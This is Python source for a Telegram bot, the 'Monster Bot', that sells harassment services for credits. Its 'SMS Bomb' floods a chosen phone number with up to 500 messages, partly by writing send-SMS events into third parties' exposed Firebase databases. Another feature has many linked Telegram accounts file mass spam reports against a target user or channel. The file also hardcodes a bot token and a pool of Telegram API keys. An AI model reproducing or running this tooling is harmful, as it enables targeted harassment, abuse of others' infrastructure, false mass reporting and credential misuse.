# ================================================================
#  [K] Dotbhai Ultimate Monster Bot - FINAL (Error-Free)
# ================================================================

import asyncio, json, os, time, logging, random, string, html
from datetime import datetime
import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# Telethon Imports
from telethon import TelegramClient, functions, types
from telethon.errors import SessionPasswordNeededError

# ==================== CONFIG ====================
BOT_TOKEN = "8594487296:AAFBDQq04O0vH01ByUH7okGNTE3NoTbYZV8"
OWNER_ID = 8646237754

API_POOL = [
    (33576198, "7b59cd4d6fed5c8aa9c794f204e25050"),
    (36603675, "178e45d560ea6d3d45ef83603165f25b"),
    (34540299, "edf6ec574eb38bd1d60facca6ea360e2"),
    (31222438, "d17172a533c51807a7fc4f91bf73a5f5"),
    (37955502, "0826f6dcedf65ea1bf90743f1a577cc4"),
    (33312136, "528c3a422266cff9d8d7568896bdec3e"),
    (22015656, "23f9446294df969c87a4921a63f2c7c3"),
    (30787958, "d20dbf7672502bd1af9fa63080580a25"),
]

DATA_FILE = "bot_data.json"
SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# ==================== DATA ====================
def default_data():
    return {
        "users": {}, "admins": [], "channels": [],
        "firebases": [], "api_urls": [], "tg_reports": [], "wa_reports": [],
        "config": {"sms_cost": 2, "report_cost": 10, "wa_api_url": "", "wa_api_key": ""},
        "wa_otp": {}
    }

def load():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f: 
                d = json.load(f)
                for k, v in default_data().items():
                    if k not in d: d[k] = v
                return d
        except: pass
    d = default_data()
    save(d)
    return d

def save(d):
    with open(DATA_FILE, "w") as f: json.dump(d, f, indent=2)

def reg_user(uid, name, d):
    if str(uid) not in d["users"]:
        d["users"][str(uid)] = {"name": name, "credits": 0, "premium_until": 0, "ref_count": 0, "referrer_id": None}

def is_admin(uid, d): return uid == OWNER_ID or uid in d.get("admins", [])

def is_premium(uid, d):
    u = d["users"].get(str(uid))
    if not u: return False
    if u["premium_until"] == "PERMANENT": return True
    return u.get("premium_until", 0) > time.time()

def get_prem_text(uid, d):
    u = d["users"].get(str(uid))
    if not u or u.get("premium_until", 0) == 0: return "❌ Free User"
    if u["premium_until"] == "PERMANENT": return "♾ Permanent Premium"
    return f"💎 Premium until {datetime.fromtimestamp(u['premium_until']).strftime('%Y-%m-%d')}"

def update_premium(uid, d):
    u = d["users"].get(str(uid))
    if not u: return
    n = u.get("ref_count", 0)
    cur = u.get("premium_until", 0)
    if n >= 50 and cur != "PERMANENT": u["premium_until"] = "PERMANENT"
    elif n >= 15 and cur != "PERMANENT":
        if cur < time.time(): u["premium_until"] = int(time.time() + (30 * 86400))

# ==================== UI ====================
def btn(text, cb): return InlineKeyboardButton(text=text, callback_data=cb)

def main_kb(uid, d):
    rows = [
        [btn("💥 SMS Bomb", "u:bomb"), btn("🚨 TG Report", "u:rep_tg")],
        [btn("💬 WA Report", "u:rep_wa"), btn("💎 Premium", "u:premium")],
        [btn("💰 Credits", "u:credits"), btn("🆘 Support", "u:support")],
        [btn("❓ Help", "u:help")]
    ]
    if is_admin(uid, d): rows.append([btn("🛡 Admin Panel", "a:panel")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("➕ Add Admin", "a:add_adm"), btn("➖ Rm Admin", "a:rm_adm")],
        [btn("📢 Add Channel", "a:add_ch"), btn("🗑 Rm Channel", "a:rm_ch")],
        [btn("🔥 Add Firebase", "a:add_fb"), btn("🔗 Add API URL", "a:add_api")],
        [btn("📱 Add TG Report", "a:add_tg"), btn("💬 Add WA Number", "a:add_wa")],
        [btn("⚙ WA OTP API", "a:cfg_wa"), btn("⚙ Costs", "a:cfg_cost")],
        [btn("👤 Give Credits", "a:add_cred"), btn("💎 Give Premium", "a:add_prem")],
        [btn("📱 Link TG Account", "a:link_tg"), btn("📢 Broadcast", "a:broad")],
        [btn("📊 Stats", "a:stats"), btn("⬅ Back", "m:home")]
    ])

def back_kb(dest="m:home"): return InlineKeyboardMarkup(inline_keyboard=[[btn("⬅ Back", dest)]])
def admin_back_kb(): return InlineKeyboardMarkup(inline_keyboard=[[btn("⬅ Admin", "a:panel")]])

# ==================== FORCE JOIN ====================
async def check_join(uid, d):
    missing = []
    for ch in d.get("channels", []):
        try:
            m = await bot.get_chat_member(ch["id"], uid)
            if m.status in ("left", "kicked"): missing.append(ch)
        except: missing.append(ch)
    return missing

def join_kb(missing):
    rows = [[InlineKeyboardButton(text=f"📢 Join {c['title']}", url=c['link'])] for c in missing]
    rows.append([btn("✅ Check Again", "check_join")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ==================== TELETHON REPORTER ====================
async def tg_fire_report(target):
    sessions = [f for f in os.listdir(SESSION_DIR) if f.endswith('.session')]
    if not sessions: return 0, 0, "No TG accounts linked!"
    ok, fail = 0, 0
    clean_target = target.replace("https://t.me/", "").lstrip("@").split("/")[0]
    
    for sess_file in sessions:
        sess_path = os.path.join(SESSION_DIR, sess_file)
        api_id, api_hash = random.choice(API_POOL)
        client = TelegramClient(sess_path, api_id, api_hash)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                fail += 1
                await client.disconnect()
                continue
            ent = await client.get_entity(clean_target)
            peer = await client.get_input_entity(ent)
            try:
                await client(functions.account.ReportPeerRequest(peer=peer, reason=types.InputReportReasonSpam(), message="Spam/Scam Account"))
                ok += 1
            except:
                try:
                    await client(functions.messages.ReportRequest(peer=peer, id=[], option=types.InputReportReasonSpam(), message="Spam"))
                    ok += 1
                except: fail += 1
        except: fail += 1
        finally:
            await client.disconnect()
            await asyncio.sleep(random.uniform(2, 5))
    return ok, fail, None

# ==================== FSM STATES ====================
class S(StatesGroup):
    add_adm = State(); add_ch = State(); add_fb = State(); add_api = State()
    add_tg = State(); add_wa = State(); cfg_wa = State(); cfg_cost = State()
    add_cred = State(); add_prem = State()
    
    # Bombing states
    bomb_num = State(); bomb_msg = State(); bomb_count = State()
    
    rep_tg = State(); rep_wa = State()
    wa_phone = State(); wa_otp = State()
    tg_phone = State(); tg_code = State(); tg_pass = State()
    support = State(); broadcast = State()

# ==================== BOT SETUP ====================
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
R = Router()
dp.include_router(R)

# ==================== START & MENU ====================
@R.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    reg_user(msg.from_user.id, msg.from_user.full_name, d)
    
    args = msg.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        ref_id = args[1].replace("ref_", "")
        if ref_id != str(msg.from_user.id) and ref_id in d["users"]:
            u = d["users"][str(msg.from_user.id)]
            if not u.get("referrer_id"):
                u["referrer_id"] = ref_id
                d["users"][ref_id]["ref_count"] += 1
                d["users"][ref_id]["credits"] += 50
                update_premium(ref_id, d)
                try: await bot.send_message(int(ref_id), f"🎉 New referral! +50 credits. Refs: {d['users'][ref_id]['ref_count']}")
                except: pass
    save(d)

    missing = await check_join(msg.from_user.id, d)
    if missing: return await msg.answer("⚠️ You must join our channels to use the bot:", reply_markup=join_kb(missing))

    text = f"👋 Welcome {msg.from_user.first_name}!\n{get_prem_text(msg.from_user.id, d)}\nCredits: {d['users'][str(msg.from_user.id)]['credits']}"
    await msg.answer(text, reply_markup=main_kb(msg.from_user.id, d))

@R.callback_query(F.data == "check_join")
async def cb_check_join(cq: CallbackQuery):
    d = load()
    missing = await check_join(cq.from_user.id, d)
    if missing: return await cq.answer("❌ You haven't joined all channels!", show_alert=True)
    await cq.message.edit_text("✅ Verified! Send /start to open menu.", reply_markup=back_kb())

@R.callback_query(F.data == "m:home")
async def cb_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    text = f"🏠 Main Menu\n{get_prem_text(cq.from_user.id, d)}\nCredits: {d['users'][str(cq.from_user.id)]['credits']}"
    await cq.message.edit_text(text, reply_markup=main_kb(cq.from_user.id, d))

@R.callback_query(F.data == "u:help")
async def cb_help(cq: CallbackQuery):
    text = ("❓ <b>Help Menu</b>\n\n"
            "💥 <b>SMS Bomb:</b> Send bulk SMS via Firebase/APIs.\n"
            "🚨 <b>TG Report:</b> Mass report a Telegram user/channel.\n"
            "💬 <b>WA Report:</b> Get links to report a target on WhatsApp.\n"
            "💎 <b>Premium:</b> 15 refs = 30 days, 50 refs = Permanent.\n"
            "🆘 <b>Support:</b> Contact the Owner directly.")
    await cq.message.edit_text(text, parse_mode="HTML", reply_markup=back_kb())

@R.callback_query(F.data == "u:premium")
async def cb_premium(cq: CallbackQuery):
    d = load()
    u = d["users"].get(str(cq.from_user.id))
    link = f"https://t.me/{(await bot.get_me()).username}?start=ref_{cq.from_user.id}"
    text = (f"💎 <b>Premium</b>\nStatus: {get_prem_text(cq.from_user.id, d)}\nRefs: {u.get('ref_count', 0)}\n\n"
            f"🎁 15 Refs = 30 Days\n♾ 50 Refs = Permanent\n💰 +50 Credits per ref\n\n"
            f"🔗 Link:\n<code>{link}</code>")
    await cq.message.edit_text(text, parse_mode="HTML", reply_markup=back_kb())

@R.callback_query(F.data == "u:credits")
async def cb_credits(cq: CallbackQuery):
    d = load()
    await cq.message.edit_text(f"💰 Credits: {d['users'][str(cq.from_user.id)]['credits']}", reply_markup=back_kb())

# ==================== SUPPORT ====================
@R.callback_query(F.data == "u:support")
async def cb_support(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.support)
    await cq.message.edit_text("🆘 Send your message for the Owner:", reply_markup=back_kb())

@R.message(S.support)
async def msg_support(msg: Message, state: FSMContext):
    await state.clear()
    try:
        safe_text = html.escape(msg.text)
        await bot.send_message(OWNER_ID, f"🎫 Support from {msg.from_user.id} (@{msg.from_user.username}):\n\n{safe_text}\n\nReply using:\n<code>/reply {msg.from_user.id} your message</code>", parse_mode="HTML")
        await msg.answer("✅ Message sent to Owner.", reply_markup=back_kb())
    except: await msg.answer("❌ Failed to send.", reply_markup=back_kb())

@R.message(Command("reply"))
async def cmd_reply(msg: Message):
    if not is_admin(msg.from_user.id, load()): return
    args = msg.text.split(maxsplit=2)
    if len(args) < 3: return await msg.answer("Usage: /reply <user_id> <message>")
    try:
        safe_text = html.escape(args[2])
        await bot.send_message(int(args[1]), f"📬 <b>Owner Reply:</b>\n\n{safe_text}", parse_mode="HTML")
        await msg.answer("✅ Reply sent.")
    except Exception as e: await msg.answer(f"❌ Error: {e}")

# ==================== BOMBING ====================
@R.callback_query(F.data == "u:bomb")
async def cb_bomb(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not (is_premium(cq.from_user.id, d) or is_admin(cq.from_user.id, d)):
        return await cq.answer("💎 Premium required!", show_alert=True)
    if not d["firebases"] and not d["api_urls"]:
        return await cq.answer("⛔ No APIs configured.", show_alert=True)
    
    await state.set_state(S.bomb_num)
    await cq.message.edit_text("💥 <b>SMS Bomb</b>\n\nSend the target phone number (e.g., +919876543210):", parse_mode="HTML", reply_markup=back_kb())

@R.message(S.bomb_num)
async def msg_bomb_num(msg: Message, state: FSMContext):
    num = msg.text.strip()
    if not num.startswith("+"): num = "+" + num
    await state.update_data(b_num=num)
    await state.set_state(S.bomb_msg)
    await msg.answer(f"Target: <code>{num}</code>\n\nSend message text:", parse_mode="HTML", reply_markup=back_kb())

@R.message(S.bomb_msg)
async def msg_bomb_msg(msg: Message, state: FSMContext):
    await state.update_data(b_msg=msg.text)
    await state.set_state(S.bomb_count)
    await msg.answer("Message saved. Send count (1-500):", reply_markup=back_kb())

@R.message(S.bomb_count)
async def msg_bomb_count(msg: Message, state: FSMContext):
    d = load()
    try: count = int(msg.text)
    except: return await msg.answer("Send a valid number.")
    if not 1 <= count <= 500: return await msg.answer("Between 1-500.")
    
    cost = count * d["config"]["sms_cost"]
    if not is_admin(msg.from_user.id, d) and d["users"][str(msg.from_user.id)]["credits"] < cost:
        return await msg.answer(f"💰 Need {cost} credits.")
    
    data = await state.get_data()
    b_msg = data.get("b_msg")
    b_num = data.get("b_num")
    await state.clear()
    
    if not is_admin(msg.from_user.id, d):
        d["users"][str(msg.from_user.id)]["credits"] -= cost
        save(d)
        
    status_msg = await msg.answer(f"💥 Firing {count} SMS to {b_num}...")
    
    async def do_fire():
        ok, fail = 0, 0
        async with aiohttp.ClientSession() as sess:
            for _ in range(count):
                if d["api_urls"] and (not d["firebases"] or random.random() > 0.5):
                    url = random.choice(d["api_urls"])
                    try:
                        async with sess.post(url, json={"message": b_msg, "to": b_num, "phone": b_num}, timeout=5) as r:
                            if r.status < 500: ok += 1
                            else: fail += 1
                    except: fail += 1
                elif d["firebases"]:
                    url = random.choice(d["firebases"])
                    try:
                        async with sess.get(f"{url}/clients.json?shallow=true", timeout=5) as r:
                            devs = await r.json()
                            if devs:
                                dev_id = random.choice(list(devs.keys()))
                                payload = {"from": 0, "to": b_num, "message": b_msg, "isSended": False, "timestamp": int(time.time())}
                                async with sess.put(f"{url}/clients/{dev_id}/webhookEvent/sendSms.json", json=payload, timeout=5) as pr:
                                    if pr.status == 200: ok += 1
                                    else: fail += 1
                            else: fail += 1
                    except: fail += 1
                await asyncio.sleep(0.1)
        await status_msg.edit_text(f"💥 <b>Bomb Done</b>\nTarget: {b_num}\n✅ Success: {ok}\n❌ Failed: {fail}", parse_mode="HTML")
    asyncio.create_task(do_fire())

# ==================== REPORTING ====================
@R.callback_query(F.data == "u:rep_tg")
async def cb_rep_tg(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not (is_premium(cq.from_user.id, d) or is_admin(cq.from_user.id, d)):
        return await cq.answer("💎 Premium required!", show_alert=True)
    await state.set_state(S.rep_tg)
    await cq.message.edit_text("🚨 Send TG @username or link to report:", reply_markup=back_kb())

@R.message(S.rep_tg)
async def msg_rep_tg(msg: Message, state: FSMContext):
    await state.clear()
    await msg.answer("⏳ Firing Telethon reports (This takes time)...")
    ok, fail, err = await tg_fire_report(msg.text)
    if err: return await msg.answer(f"❌ Error: {err}")
    await msg.answer(f"✅ <b>Report Finished</b>\nSuccess: {ok}\nFailed: {fail}", reply_markup=back_kb())

@R.callback_query(F.data == "u:rep_wa")
async def cb_rep_wa(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not (is_premium(cq.from_user.id, d) or is_admin(cq.from_user.id, d)):
        return await cq.answer("💎 Premium required!", show_alert=True)
    if not d["wa_reports"]: return await cq.answer("No WA numbers configured.", show_alert=True)
    await state.set_state(S.rep_wa)
    await cq.message.edit_text("🚨 Send target phone/number:", reply_markup=back_kb())

@R.message(S.rep_wa)
async def msg_rep_wa(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    links = [f"https://wa.me/{n}?text=Reporting%20target:%20{msg.text}" for n in d["wa_reports"]]
    out = "💬 <b>WA Reports (Tap to send):</b>\n\n" + "\n".join(f'<a href="{l}">Report to {i+1}</a>' for i, l in enumerate(links[:10]))
    await msg.answer(out, parse_mode="HTML", disable_web_page_preview=True, reply_markup=back_kb())

# ==================== ADMIN PANEL ====================
@R.callback_query(F.data == "a:panel")
async def cb_admin(cq: CallbackQuery):
    if not is_admin(cq.from_user.id, load()): return await cq.answer("No access", show_alert=True)
    await cq.message.edit_text("🛡 <b>Admin Panel</b>", parse_mode="HTML", reply_markup=admin_kb())

@R.callback_query(F.data == "a:add_ch")
async def cb_add_ch(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_ch)
    await cq.message.edit_text("Send Channel ID and Link:\n<code>-100123456789 https://t.me/+abc</code>", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.add_ch)
async def msg_add_ch(msg: Message, state: FSMContext):
    d = load()
    try:
        cid, link = msg.text.split()
        title = "Channel"
        try: title = (await bot.get_chat(int(cid))).title
        except: pass
        d["channels"].append({"id": int(cid), "link": link, "title": title})
        save(d)
        await msg.answer(f"✅ Added {title}", reply_markup=admin_back_kb())
    except: await msg.answer("❌ Format: ID LINK")
    await state.clear()

@R.callback_query(F.data == "a:rm_ch")
async def cb_rm_ch(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d): return
    if not d["channels"]: return await cq.answer("No channels.", show_alert=True)
    rows = [[btn(f"❌ {c['title']}", f"rmch_{c['id']}")] for c in d["channels"]]
    rows.append([btn("⬅ Back", "a:panel")])
    await cq.message.edit_text("Select channel to remove:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("rmch_"))
async def cb_rmch(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d): return
    cid = int(cq.data.split("_")[1])
    d["channels"] = [c for c in d["channels"] if c["id"] != cid]
    save(d)
    await cq.message.edit_text("✅ Channel removed.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:add_api")
async def cb_add_api(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_api)
    await cq.message.edit_text("Send API URL(s) line by line (POST {'message':'...'}):", reply_markup=admin_back_kb())

@R.message(S.add_api)
async def msg_add_api(msg: Message, state: FSMContext):
    d = load()
    added = 0
    for line in msg.text.split("\n"):
        u = line.strip()
        if u.startswith("http") and u not in d["api_urls"]:
            d["api_urls"].append(u)
            added += 1
    save(d)
    await state.clear()
    await msg.answer(f"✅ Added {added} API URLs.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:add_fb")
async def cb_add_fb(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_fb)
    await cq.message.edit_text("Send Firebase URL(s) line by line:", reply_markup=admin_back_kb())

@R.message(S.add_fb)
async def msg_add_fb(msg: Message, state: FSMContext):
    d = load()
    added = 0
    for line in msg.text.split("\n"):
        u = line.strip().rstrip("/")
        if u.startswith("http") and u not in d["firebases"]:
            d["firebases"].append(u)
            added += 1
    save(d)
    await state.clear()
    await msg.answer(f"✅ Added {added} Firebase URLs.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:add_tg")
async def cb_add_tg(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_tg)
    await cq.message.edit_text("Send TG Report @username or ID:", reply_markup=admin_back_kb())

@R.message(S.add_tg)
async def msg_add_tg(msg: Message, state: FSMContext):
    d = load()
    if msg.text not in d["tg_reports"]:
        d["tg_reports"].append(msg.text)
        save(d)
    await state.clear()
    await msg.answer(f"✅ Added {msg.text}", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:add_wa")
async def cb_add_wa(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.wa_phone)
    await cq.message.edit_text("Send WA number with country code:", reply_markup=admin_back_kb())

@R.message(S.wa_phone)
async def msg_add_wa(msg: Message, state: FSMContext):
    digits = "".join(c for c in msg.text if c.isdigit())
    if len(digits) < 10: return await msg.answer("Invalid number.")
    
    d = load()
    url, key = d["config"]["wa_api_url"], d["config"]["wa_api_key"]
    
    if url and key:
        otp = str(random.randint(100000, 999999))
        d["wa_otp"][digits] = {"otp": otp, "exp": time.time() + 300}
        save(d)
        try:
            async with aiohttp.ClientSession() as s:
                async with s.post(url, json={"phone": digits, "otp": otp}, headers={"Authorization": f"Bearer {key}"}) as r:
                    if r.status in (200, 201):
                        await state.update_data(wa_ph=digits)
                        await state.set_state(S.wa_otp)
                        return await msg.answer("📨 OTP Sent. Enter OTP:", reply_markup=admin_back_kb())
                    else: return await msg.answer(f"❌ API Error: {r.status}")
        except Exception as e: return await msg.answer(f"❌ Network: {e}")
    else:
        d["wa_reports"].append(digits)
        save(d)
        await state.clear()
        await msg.answer(f"✅ Saved (No OTP API).", reply_markup=admin_back_kb())

@R.message(S.wa_otp)
async def msg_wa_otp(msg: Message, state: FSMContext):
    data = await state.get_data()
    ph = data.get("wa_ph")
    d = load()
    rec = d["wa_otp"].get(ph)
    
    if not rec or rec["exp"] < time.time() or rec["otp"] != msg.text:
        return await msg.answer("❌ Wrong/Expired OTP.")
    
    d["wa_reports"].append(ph)
    del d["wa_otp"][ph]
    save(d)
    await state.clear()
    await msg.answer("✅ Number Verified!", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:cfg_wa")
async def cb_cfg_wa(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.cfg_wa)
    await cq.message.edit_text("Send WA OTP API: <code>URL|KEY</code>\nOr 'clear':", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.cfg_wa)
async def msg_cfg_wa(msg: Message, state: FSMContext):
    d = load()
    if msg.text.lower() == "clear":
        d["config"]["wa_api_url"] = ""
        d["config"]["wa_api_key"] = ""
    elif "|" in msg.text:
        u, k = msg.text.split("|", 1)
        d["config"]["wa_api_url"] = u.strip()
        d["config"]["wa_api_key"] = k.strip()
    save(d)
    await state.clear()
    await msg.answer("✅ Updated.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:cfg_cost")
async def cb_cfg_cost(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.cfg_cost)
    await cq.message.edit_text("Send new SMS Cost (credits):", reply_markup=admin_back_kb())

@R.message(S.cfg_cost)
async def msg_cfg_cost(msg: Message, state: FSMContext):
    d = load()
    try:
        d["config"]["sms_cost"] = int(msg.text)
        save(d)
        await msg.answer(f"✅ Cost set to {msg.text}.", reply_markup=admin_back_kb())
    except: await msg.answer("❌ Invalid.")
    await state.clear()

@R.callback_query(F.data == "a:add_cred")
async def cb_add_cred(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_cred)
    await cq.message.edit_text("Send: <code>user_id amount</code>", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.add_cred)
async def msg_add_cred(msg: Message, state: FSMContext):
    d = load()
    try:
        uid, amt = msg.text.split()
        if uid in d["users"]:
            d["users"][uid]["credits"] += int(amt)
            save(d)
            await msg.answer(f"✅ Added {amt} to {uid}.", reply_markup=admin_back_kb())
            try: await bot.send_message(int(uid), f"💰 Admin added {amt} credits!")
            except: pass
        else: await msg.answer("❌ Not found.")
    except: await msg.answer("❌ Format: ID AMOUNT")
    await state.clear()

@R.callback_query(F.data == "a:add_prem")
async def cb_add_prem(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_prem)
    await cq.message.edit_text("Send: <code>user_id days</code> (or 'perm')", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.add_prem)
async def msg_add_prem(msg: Message, state: FSMContext):
    d = load()
    try:
        uid, val = msg.text.split()
        if uid in d["users"]:
            d["users"][uid]["premium_until"] = "PERMANENT" if val.lower() == "perm" else int(time.time() + (int(val) * 86400))
            save(d)
            await msg.answer(f"✅ Updated {uid}.", reply_markup=admin_back_kb())
        else: await msg.answer("❌ Not found.")
    except: await msg.answer("❌ Format: ID DAYS")
    await state.clear()

@R.callback_query(F.data == "a:broad")
async def cb_broad(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.broadcast)
    await cq.message.edit_text("Send message to broadcast to ALL users:", reply_markup=admin_back_kb())

@R.message(S.broadcast)
async def msg_broad(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    ok, fail = 0, 0
    safe_text = html.escape(msg.text)
    for uid in d["users"]:
        try:
            await bot.send_message(int(uid), f"📢 <b>Broadcast:</b>\n\n{safe_text}", parse_mode="HTML")
            ok += 1
            await asyncio.sleep(0.05)
        except: fail += 1
    await msg.answer(f"✅ Broadcast Done.\nSuccess: {ok}\nFailed: {fail}", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:add_adm")
async def cb_add_adm(cq: CallbackQuery, state: FSMContext):
    if cq.from_user.id != OWNER_ID: return await cq.answer("Owner only!", show_alert=True)
    await state.set_state(S.add_adm)
    await cq.message.edit_text("Send User ID to make Admin:", reply_markup=admin_back_kb())

@R.message(S.add_adm)
async def msg_add_adm(msg: Message, state: FSMContext):
    d = load()
    try:
        uid = int(msg.text)
        if uid not in d["admins"]: d["admins"].append(uid)
        save(d)
        await msg.answer("✅ Admin Added.", reply_markup=admin_back_kb())
    except: await msg.answer("❌ Invalid ID.")
    await state.clear()

@R.callback_query(F.data == "a:rm_adm")
async def cb_rm_adm(cq: CallbackQuery):
    if cq.from_user.id != OWNER_ID: return await cq.answer("Owner only!", show_alert=True)
    d = load()
    if not d["admins"]: return await cq.answer("No admins.", show_alert=True)
    rows = [[btn(f"❌ {a}", f"rmadm_{a}")] for a in d["admins"]]
    rows.append([btn("⬅ Back", "a:panel")])
    await cq.message.edit_text("Select admin to remove:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("rmadm_"))
async def cb_rmadm(cq: CallbackQuery):
    if cq.from_user.id != OWNER_ID: return await cq.answer("Owner only!", show_alert=True)
    d = load()
    uid = int(cq.data.split("_")[1])
    if uid in d["admins"]: d["admins"].remove(uid)
    save(d)
    await cq.message.edit_text("✅ Admin Removed.", reply_markup=admin_back_kb())

# ==================== TELETHON LINKING ====================
@R.callback_query(F.data == "a:link_tg")
async def cb_link_tg(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.tg_phone)
    await cq.message.edit_text("📱 Send phone number (e.g. +91...):", reply_markup=admin_back_kb())

@R.message(S.tg_phone)
async def msg_tg_phone(msg: Message, state: FSMContext):
    ph = msg.text.strip().replace(" ", "")
    api_id, api_hash = random.choice(API_POOL)
    client = TelegramClient(f"sessions/{ph}", api_id, api_hash)
    await client.connect()
    try:
        sent = await client.send_code_request(ph)
        await state.update_data(ph=ph, hash=sent.phone_code_hash, c=client)
        await state.set_state(S.tg_code)
        await msg.answer("📨 Code sent. Enter Telegram code:", reply_markup=admin_back_kb())
    except Exception as e:
        await msg.answer(f"❌ Error: {e}")
        await state.clear()

@R.message(S.tg_code)
async def msg_tg_code(msg: Message, state: FSMContext):
    data = await state.get_data()
    client = data["c"]
    try:
        await client.sign_in(data["ph"], msg.text, phone_code_hash=data["hash"])
        await client.disconnect()
        await state.clear()
        await msg.answer("✅ Linked!", reply_markup=admin_back_kb())
    except SessionPasswordNeededError:
        await state.set_state(S.tg_pass)
        await msg.answer("🔐 2FA Required. Send password:", reply_markup=admin_back_kb())
    except Exception as e:
        await msg.answer(f"❌ Error: {e}")
        await state.clear()

@R.message(S.tg_pass)
async def msg_tg_pass(msg: Message, state: FSMContext):
    data = await state.get_data()
    client = data["c"]
    try:
        await client.sign_in(password=msg.text)
        await client.disconnect()
        await state.clear()
        await msg.answer("✅ Linked with 2FA!", reply_markup=admin_back_kb())
    except Exception as e:
        await msg.answer(f"❌ Error: {e}")
        await state.clear()

@R.callback_query(F.data == "a:stats")
async def cb_stats(cq: CallbackQuery):
    d = load()
    sess = len([f for f in os.listdir(SESSION_DIR) if f.endswith('.session')])
    text = (f"📊 <b>Stats</b>\nUsers: {len(d['users'])}\n"
            f"Firebase: {len(d['firebases'])}\nAPIs: {len(d['api_urls'])}\n"
            f"TG Sessions: {sess}\nWA Numbers: {len(d['wa_reports'])}\n"
            f"Channels: {len(d['channels'])}")
    await cq.message.edit_text(text, parse_mode="HTML", reply_markup=admin_back_kb())

async def main():
    print("[K] Monster Bot Starting...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
